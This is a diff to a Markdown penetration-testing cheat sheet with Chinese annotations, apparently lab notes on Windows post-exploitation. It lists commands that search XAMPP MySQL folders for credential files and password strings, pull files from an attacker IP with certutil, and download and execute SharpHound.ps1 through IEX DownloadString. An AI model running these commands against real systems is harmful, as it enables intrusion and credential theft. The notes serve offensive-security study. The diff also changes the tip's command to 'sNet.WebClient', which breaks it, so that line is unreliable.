@@ -519,14 +519,14 @@ uid=1001(tom) gid=1001(tom) groups=1001(tom)
 `Get-ChildItem -Path C:\ -Recurse -Force -ErrorAction SilentlyContinue -Filter "*DVR*" `
     - mysql: 
         - `dir C:\xampp\mysql\data\mysql\global_priv.*`\
-        - `Get-ChildItem -Path C:\xampp\mysql\ -Recurse -Include *.sql,*.txt,*.cnf,*.ini`\
+        - `Get-ChildItem -Path C:\xampp\mysql\ -Recurse -Include *.sql,*.txt,*.cnf,*.ini` (`*.bat`, `*.kdbx`, `*.zip`)
         - `Select-String -Path C:\xampp\mysql\**\* -Pattern "password", "auth", "user", "connection"`
 - Get File: `iwr`, `wget`, `curl`, (-UseBasicParsing)
     - `certutil -urlcache -split -f http://{IP}/{File} {Output File}`
     - `(New-Object Net.WebClient).DownloadString("http://{IP}/{File}")`
 
 >[!Tip]
->`IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.71/SharpHound.ps1')`\
+>`IEX (New-Object sNet.WebClient).DownloadString('http://10.10.14.71/SharpHound.ps1')`\
 >下載並執行 PowerShell 原始碼（純文字）
 >>✅ 用途：立即執行從遠端伺服器下載的 PowerShell 原始碼（如 .ps1)\
 >>`DownloadString` 是用來處理文字（如 PowerShell 腳本），無法下載二進位檔 (exe)
